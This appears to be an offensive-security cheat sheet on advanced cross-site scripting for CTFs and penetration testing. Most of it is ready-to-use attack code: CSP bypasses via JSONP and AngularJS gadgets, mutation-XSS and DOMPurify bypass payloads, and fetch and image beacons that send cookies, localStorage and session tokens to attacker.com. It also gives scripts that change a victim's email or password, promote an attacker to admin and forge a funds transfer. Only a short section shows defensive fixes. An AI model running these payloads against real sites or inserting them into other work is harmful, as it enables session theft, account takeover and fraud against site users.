# XSS — Advanced Exploitation

---

## Quick Reference

| Attack | Trigger | Impact |
|--------|---------|--------|
| CSP bypass via JSONP | `<script src="allowed-cdn/jsonp?callback=alert">` | Execute JS despite CSP |
| CSP bypass via open redirect | `<script src="trusted-site/redirect?url=//evil/evil.js">` | Load external script via trusted domain |
| mXSS | Inject crafted HTML that mutates after sanitization | Bypass DOMPurify / HTML sanitizers |
| XSS → account takeover | `fetch('/change-email', {method:'POST', body:'email=attacker@evil.com'})` | Full account takeover |
| XSS → CSRF | Use XSS to forge state-changing requests with victim's session | Bypass CSRF token |
| postMessage XSS | Send malicious message to `addEventListener('message')` handler | Cross-origin XSS |
| Dangling markup | Inject unclosed tag to exfiltrate page content | Steal CSRF tokens without JS |
| XSS in SVG/XML | `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>` | Bypass HTML-only filters |

---

## What are Advanced XSS Attacks? 🔓

Advanced XSS goes beyond `alert(1)`. It chains XSS with CSP bypasses, sanitizer evasion, cross-origin messaging abuse, and account takeover techniques. The goal shifts from proving execution to **doing something impactful** with that execution.

**Impact:**
- 🔴 Full account takeover — change email/password, steal tokens, forge requests
- 🔴 Admin panel compromise — XSS fires on admin → attacker inherits admin session
- 🔴 CSP bypass — execute arbitrary JS despite strict Content-Security-Policy headers
- 🔴 Cross-origin data theft — postMessage and dangling markup leak data across origins
- ⚠️ Every advanced technique assumes you already have basic XSS execution — escalation from `alert(1)`

---

## Content Security Policy (CSP) Bypass

CSP is the primary XSS defense. It restricts which scripts the browser will execute. Understanding CSP means understanding how to bypass it.

### Reading CSP Headers

```http
-- Strict CSP (hard to bypass):
Content-Security-Policy: default-src 'none'; script-src 'self'; object-src 'none'

-- Weak CSP (bypassable):
Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net 'unsafe-eval'
```

**Key directives:**

```
script-src     → controls which scripts can execute
default-src    → fallback for all resource types
unsafe-inline  → allows inline <script> and event handlers
unsafe-eval    → allows eval(), setTimeout(string), etc.
nonce-XXX      → allows scripts with matching nonce attribute
sha256-XXX     → allows scripts matching the hash
```

### Bypass 1 — JSONP Endpoints on Whitelisted Domains

If a trusted CDN or API hosts a JSONP endpoint, use the `callback` parameter to inject arbitrary JS:

```html
<!-- CSP allows: script-src https://accounts.google.com -->
<script src="https://accounts.google.com/o/oauth2/revoke?token=alert(1)"></script>

<!-- CSP allows: script-src https://ajax.googleapis.com -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
<!-- Then use Angular template injection: -->
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>

<!-- CSP allows: script-src https://cdnjs.cloudflare.com -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

### Bypass 2 — Open Redirect on Whitelisted Domain

```html
<!-- CSP: script-src https://trusted.com -->
<!-- trusted.com has an open redirect -->
<script src="https://trusted.com/redirect?url=https://attacker.com/evil.js"></script>
```

### Bypass 3 — `unsafe-eval` Present

```javascript
// If CSP allows unsafe-eval:
eval('alert(1)')
setTimeout('alert(1)', 0)
setInterval('alert(1)', 0)
new Function('alert(1)')()
```

### Bypass 4 — Nonce Leak / Reuse

```html
<!-- If nonce is predictable or leaked in DOM: -->
<!-- Read nonce from existing script tag -->
<script nonce="LEAKED_NONCE">alert(1)</script>

// Find nonce via DOM:
document.querySelector('script').nonce
// Or check page source for: nonce="XXX"
```

### Bypass 5 — `base-uri` Not Set

```html
<!-- If base-uri is not in CSP, inject a base tag to hijack relative script src -->
<base href="https://attacker.com/">
<!-- All relative <script src="./app.js"> now load from attacker.com -->
```

### Bypass 6 — `object-src` Not Set / Allows Plugins

```html
<!-- Flash / object bypass (old browsers) -->
<object data="https://attacker.com/xss.swf"></object>

<!-- If object-src defaults to script-src and that's weak -->
<object data="data:text/html,<script>alert(1)</script>"></object>
```

### Bypass 7 — Script Gadgets in Whitelisted Libraries

Some libraries loaded from trusted CDNs contain "gadgets" — code paths that execute arbitrary JS from DOM attributes:

```html
<!-- AngularJS (any version on the allowlist) -->
<script src="https://cdn/angular.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>

<!-- Vue.js -->
<script src="https://cdn/vue.js"></script>
<div id="app">{{constructor.constructor('alert(1)')()}}</div>

<!-- jQuery (with XSS-able selector) -->
$(location.hash)   // location.hash = #<img src=x onerror=alert(1)>
```

### Bypass 8 — `strict-dynamic`

```html
<!-- strict-dynamic allows scripts loaded by trusted scripts -->
<!-- If you can get a trusted script to load yours: -->
<!-- Inject into a trusted script's fetch/import call -->
import('https://attacker.com/evil.js')   // if inside trusted script
```

---

## Mutation XSS (mXSS)

mXSS exploits a quirk where **HTML sanitizers** parse HTML differently than browsers. A payload is "safe" after sanitization but mutates into something dangerous when the browser re-parses it.

### How mXSS Works

```
1. Attacker injects:  <noscript><p title="</noscript><img src=x onerror=alert(1)>">
2. Sanitizer parses: noscript is a valid tag, title attr is just a string → "safe"
3. Browser renders: with JS enabled, noscript is inactive → parser switches context
4. Browser sees:     </noscript> closes noscript → <img src=x onerror=alert(1)> executes
```

### Classic mXSS Payloads

```html
<!-- noscript context switch -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- table context switch (browsers auto-close certain elements) -->
<table><td><style><img src=x onerror=alert(1)></style></td></table>

<!-- math/svg namespace confusion -->
<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">

<!-- svg foreignObject namespace switch -->
<svg><foreignObject><div><style><a id="</style><img src=x onerror=alert(1)>">

<!-- HTML entity mutation -->
<a href="javascript&colon;alert(1)">click</a>
<!-- Browser decodes &colon; → : after sanitizer runs -->
```

### DOMPurify Bypasses (version-specific)

```html
<!-- DOMPurify < 2.0.1 -->
<svg><use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"></use></svg>

<!-- Prototype pollution + DOMPurify -->
// Pollute prototype to bypass isAllowedAttr check
Object.prototype.innerHTML = "<img src=x onerror=alert(1)>"

<!-- DOMPurify bypass via namespace confusion -->
<svg><use href="#x"><svg xmlns="http://www.w3.org/2000/svg" id="x">
<image href="1" onerror="alert(1)"/></svg></use></svg>
```

---

## XSS to Account Takeover

Once XSS fires in a victim's session, these fetch-based payloads perform account takeover actions.

### Steal Session Token / JWT

```javascript
// If token is in localStorage (HttpOnly doesn't protect this!)
fetch('https://attacker.com/?t=' + localStorage.getItem('token'));
fetch('https://attacker.com/?t=' + sessionStorage.getItem('jwt'));

// If token is in a cookie without HttpOnly:
fetch('https://attacker.com/?c=' + document.cookie);

// Steal everything in one shot:
fetch('https://attacker.com/?' + new URLSearchParams({
    cookies: document.cookie,
    local: JSON.stringify(localStorage),
    session: JSON.stringify(sessionStorage),
    origin: location.origin
}));
```

### Change Email Address

```javascript
// Step 1 — get CSRF token if needed
fetch('/account/settings')
    .then(r => r.text())
    .then(html => {
        const token = html.match(/csrf[^"]*"([^"]+)"/)[1];
        // Step 2 — change email with stolen token
        return fetch('/account/change-email', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: `email=attacker@evil.com&csrf=${token}`
        });
    })
    .then(() => fetch('https://attacker.com/done'));
```

### Change Password

```javascript
// Requires knowing current password structure — check settings page first
fetch('/account/settings')
    .then(r => r.text())
    .then(html => {
        const csrf = html.match(/name="csrf" value="([^"]+)"/)[1];
        return fetch('/account/change-password', {
            method: 'POST',
            credentials: 'include',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: `new_password=hacked123&confirm=hacked123&csrf=${csrf}`
        });
    });
```

### Add Attacker as Admin (if admin XSS)

```javascript
// XSS fires on admin → make attacker account admin
fetch('/admin/users/promote', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({userId: 'ATTACKER_USER_ID', role: 'admin'})
});
```

### Full Exfiltration Payload (Compact)

```html
<!-- Everything in one img onerror — no spaces, minimal chars -->
<img src=x onerror="fetch('//attacker.com/?'+btoa(document.cookie+localStorage.token))">

<!-- Stored XSS compact payload -->
<script>fetch('//attacker.com/?c='+btoa(document.cookie))</script>
```

---

## CSRF via XSS

XSS bypasses CSRF protections because the script runs in the victim's origin — it can read the page, extract CSRF tokens, and submit forms.

```javascript
// Pattern: read page → extract token → submit forged request

// Example: transfer funds
async function csrfViaXss() {
    // Step 1: Get the transfer page (has CSRF token)
    const resp = await fetch('/transfer', {credentials: 'include'});
    const html = await resp.text();

    // Step 2: Extract CSRF token
    const token = new DOMParser()
        .parseFromString(html, 'text/html')
        .querySelector('input[name="csrf"]')
        .value;

    // Step 3: Submit forged transfer
    await fetch('/transfer', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `amount=10000&to=attacker&csrf=${token}`
    });
}

csrfViaXss();
```

---

## postMessage XSS

`postMessage` allows cross-origin communication between windows. Vulnerable handlers trust the message without validating the origin.

### Finding Vulnerable Handlers

```javascript
// Search JS for postMessage listeners:
window.addEventListener('message', handler)
window.onmessage = handler

// Vulnerable handler — no origin check:
window.addEventListener('message', function(e) {
    document.getElementById('content').innerHTML = e.data;  // ← sink
});
```

### Exploitation

```html
<!-- Host this on attacker.com, open target.com in an iframe -->
<iframe id="target" src="https://vulnerable.com/page"></iframe>
<script>
document.getElementById('target').onload = function() {
    // Send XSS payload via postMessage
    this.contentWindow.postMessage(
        '<img src=x onerror=alert(document.domain)>',
        '*'    // no target origin restriction
    );
};
</script>
```

### Stealing Data via postMessage

```javascript
// If parent window listens for messages from iframe:
// Attacker controls iframe content → sends malicious message to parent

// In malicious iframe:
window.parent.postMessage({action: 'redirect', url: 'https://attacker.com'}, '*');

// If parent has:
window.addEventListener('message', e => {
    if (e.data.action === 'redirect') location = e.data.url;  // open redirect via postMessage
});
```

---

## Dangling Markup Injection

When CSP blocks script execution entirely but you can still inject HTML, use dangling markup to **exfiltrate data without JavaScript**.

### How It Works

```html
<!-- Page contains a CSRF token: -->
<input name="csrf" value="SECRET_TOKEN">
<p>Hello USER_INPUT</p>   ← injection point

<!-- Inject unclosed attribute to capture everything until next quote: -->
<img src='https://attacker.com/?data=

<!-- Browser constructs: -->
<img src='https://attacker.com/?data=SECRET_TOKEN">
<!--                               ^^^^^^^^^^^^^^^^^^ captured in GET request to attacker -->
```

### Dangling Markup Payload

```html
<!-- Capture CSRF token and following content -->
<img src='https://attacker.com/?x=

<!-- Capture form action and fields -->
<form action='https://attacker.com/capture'><button>click

<!-- Tab/newline to bypass some CSP checks on attribute injection -->
<img	src='https://attacker.com/?x=
```

---

## XSS in Special Contexts

### SVG XSS

```xml
<!-- SVG files execute scripts in some browsers -->
<svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.domain)</script>
</svg>

<!-- Inline SVG in HTML -->
<svg><script>alert(1)</script></svg>

<!-- SVG animate -->
<svg><animate onbegin=alert(1) attributeName=x></svg>

<!-- SVG use element SSRF/XSS -->
<svg><use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#"></use></svg>
```

### XSS in JSON Response

```javascript
// If JSON is rendered in a JS context without parsing:
// Server returns: {"name": "USER_INPUT"}
// Vulnerable client code:
eval('var data = ' + jsonResponse);

// Inject:
{"name": "x\"}; alert(1); //"}

// Or if JSON is written to innerHTML:
// Inject as name: <img src=x onerror=alert(1)>
```

### XSS in File Upload (SVG, HTML, XML)

```bash
# Upload an SVG file with embedded XSS:
cat > evil.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert(document.domain)</script>
</svg>
EOF

# If server serves uploaded SVGs with correct MIME type → XSS fires when visited
# Upload as: evil.svg or evil.html or evil.xml
```

### XSS via HTTP Response Headers

```http
-- If server reflects headers back into HTML:
X-Custom-Header: <script>alert(1)</script>

-- Or via URL-based injection into error pages:
GET /<script>alert(1)</script> HTTP/1.1
-- If 404 page reflects the path: XSS fires
```

### XSS in Markdown Renderers

```markdown
[click me](javascript:alert(1))
![x](x onerror=alert(1))
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

---

## Blind XSS

Blind XSS fires in a context you can't directly see — admin panels, support tickets, log viewers, email clients.

### Detecting Blind XSS

```html
<!-- Use a payload that phones home when executed: -->
<script src="https://YOUR-ID.xss.ht"></script>

<!-- XSSHunter payloads (self-hosted or xss.report): -->
"><script src=//xss.report/YOUR-ID></script>
'><script src=//xss.report/YOUR-ID></script>
<img src=x onerror="var s=document.createElement('script');s.src='//xss.report/YOUR-ID';document.body.appendChild(s)">

<!-- Burp Collaborator version: -->
<script>fetch('//YOUR-ID.burpcollaborator.net/?'+document.cookie)</script>

<!-- Manually: -->
<script>
new Image().src='https://attacker.com/blind?'+
    encodeURIComponent(JSON.stringify({
        cookie: document.cookie,
        url: location.href,
        dom: document.documentElement.innerHTML.substring(0,1000)
    }));
</script>
```

### Where Blind XSS Fires

```
- Admin panels that display user submissions
- Support ticket systems
- Contact forms
- Log viewers / analytics dashboards
- Email body rendered in webmail
- User-agent / referer displayed in admin analytics
- PDF generation from user content
- Error message logs displayed to developers
```

---

## Filter Evasion Techniques

### Event Handler Alternatives

```html
<!-- Fire without user interaction: -->
<body onload=alert(1)>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video autoplay onplay=alert(1) src=x>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<audio autoplay onplay=alert(1) src=x>
```

### Encoding Tricks

```html
<!-- HTML entity encoding -->
<img src=x onerror="&#97;lert(1)">       <!-- a encoded -->
<img src=x onerror="&#x61;lert(1)">      <!-- a hex encoded -->

<!-- URL encoding (in href/src) -->
<a href="javascript:%61lert(1)">click</a>

<!-- Double URL encoding -->
<a href="javascript:%2561lert(1)">click</a>

<!-- Unicode escape in JS strings -->
<script>'\u0061lert(1)'</script>
<script>eval('\u0061\u006c\u0065\u0072\u0074(1)')</script>

<!-- HTML entities in JS string context -->
<svg><script>alert&lpar;1&rpar;</script></svg>
```

### Tag and Attribute Obfuscation

```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>

<!-- Extra whitespace / newlines -->
<img
src=x
onerror
=
alert(1)>

<!-- Tab instead of space -->
<img	src=x	onerror=alert(1)>

<!-- Slash as separator -->
<img/src=x/onerror=alert(1)>

<!-- Null byte (some parsers) -->
<scr\x00ipt>alert(1)</scr\x00ipt>

<!-- Comment insertion -->
<scr<!---->ipt>alert(1)</scr<!---->ipt>
```

---

## Exploitation Workflow

1. **Confirm XSS and note the context** — which type, which injection point
2. **Check for CSP** — `curl -I https://target.com | grep -i csp` — read the directives
3. **If CSP present** — check for JSONP on whitelisted domains, `unsafe-eval`, `unsafe-inline`, missing `base-uri`
4. **If sanitizer present** — test mXSS payloads; try namespace confusion (SVG, math, noscript)
5. **Escalate beyond alert** — steal `localStorage`, `sessionStorage`, cookies
6. **If HttpOnly on cookies** — fetch API calls to change email/password instead
7. **If CSRF token needed** — fetch the settings page, extract token, forge request
8. **For blind XSS** — use XSSHunter or Burp Collaborator payload in every input field
9. **For admin XSS** — use "report to admin" features; payload makes attacker admin
10. **Deliver** — craft URL (reflected), submit form (stored), or postMessage (DOM)

---

## Common Vulnerable Patterns

**Missing origin check on postMessage:**

```javascript
// ❌ Vulnerable — processes message from any origin
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
});

// ✅ Fixed — validate origin
window.addEventListener('message', function(e) {
    if (e.origin !== 'https://trusted.com') return;
    document.getElementById('output').textContent = e.data;  // textContent not innerHTML
});
```

**CSP with unsafe-inline (negates XSS protection):**

```http
# ❌ Useless CSP — unsafe-inline allows all inline scripts
Content-Security-Policy: script-src 'self' 'unsafe-inline'

# ✅ Effective CSP — nonce-based
Content-Security-Policy: script-src 'nonce-RANDOM_PER_REQUEST'
```

**innerHTML with "sanitized" input:**

```javascript
// ❌ Vulnerable — sanitizer bypass possible (mXSS)
element.innerHTML = userSanitize(userInput);

// ✅ Fixed — use trusted sanitizer correctly
element.innerHTML = DOMPurify.sanitize(userInput);
// AND keep DOMPurify updated — older versions had bypasses
```

**Dangling markup via unescaped attribute:**

```html
<!-- ❌ Vulnerable — user input in unquoted attribute -->
<img src=<?= $userInput ?>>

<!-- ✅ Fixed — quoted and escaped -->
<img src="<?= htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8') ?>">
```

---

## CTF & Practical Tips

**CSP check one-liner:**

```bash
curl -si https://target.com/ | grep -i "content-security-policy"
# No CSP → basic payloads work
# script-src 'self' → need same-origin script or JSONP bypass
# unsafe-eval → eval() works
# Has nonce → need nonce leak
```

**Speed tips:**
- ✅ No CSP → `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>` directly
- ✅ CSP blocks inline → check whitelisted domains for JSONP endpoints (`?callback=alert`)
- ✅ Angular on allowlist → `<div ng-app>{{constructor.constructor('alert(1)')()}}</div>`
- ✅ Blind XSS → XSSHunter free tier, or Burp Collaborator — paste payload in EVERY field
- ✅ HttpOnly cookie → skip cookie theft, go straight to `fetch('/change-email', ...)`
- ✅ "Report to admin" in CTF → stored XSS that fires on admin → steal admin cookie or promote self
- ⚠️ `<script>` via `innerHTML` never executes — always use event handler based payloads for DOM injection
- ⚠️ mXSS is version-specific — check DOMPurify version from package.json or JS source before trying

**Common CTF scenarios:**
- **"Admin reviews submissions"** → blind XSS → XSSHunter → steal admin cookie
- **"CSP blocks scripts"** → find Angular/jQuery on allowlist → script gadget
- **"DOMPurify sanitizes"** → check version → try known bypass for that version
- **"iframe with postMessage"** → no origin check → send XSS payload via postMessage
- **"Markdown renderer"** → `[x](javascript:alert(1))` or raw HTML tags
- **"SVG upload allowed"** → upload SVG with `<script>alert(1)</script>`

---

## Key Takeaways

- ✅ CSP is bypassable — JSONP on whitelisted CDNs, `unsafe-eval`, script gadgets in Angular/jQuery are the most common CTF paths
- ✅ mXSS bypasses sanitizers by exploiting parser differences between the sanitizer and the browser — test noscript and SVG namespace payloads
- ✅ XSS → account takeover requires fetching a CSRF token first, then submitting a forged state-changing request — `alert()` is just the proof of concept
- ✅ Blind XSS fires in contexts you can't see — use XSSHunter or Burp Collaborator and submit payloads everywhere
- ✅ postMessage handlers without origin checks are a cross-origin XSS surface — inject via iframe from attacker's domain
- ✅ HttpOnly cookies can't be stolen — pivot to fetch-based account actions using the victim's active session